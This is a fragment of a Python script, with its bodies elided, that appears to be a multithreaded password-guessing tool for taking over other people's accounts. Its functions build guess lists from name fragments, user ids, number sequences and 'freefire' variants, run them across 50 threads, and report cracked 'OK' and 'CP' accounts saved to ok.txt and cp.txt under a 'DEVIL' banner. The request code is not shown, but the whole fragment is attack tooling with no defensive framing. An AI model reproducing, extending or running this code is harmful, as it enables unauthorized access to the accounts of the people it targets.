...
def num():
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'112233','123123','223344','334455','445566','556677','667788','224466','446688','336699','freefire','freefire123','freefire@123',]
            #pwx = ['freefire','freefire12345','freefire1234','freefire123','freefire12','freefire1','freefire@12345','freefire@1234','freefire@123','freefire@12','freefire@1','freefire@','free fire','Free Fire','FreeFire',]
...
def gml():
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345','freefire@123','free fire','freefire123']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mDEVIL\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
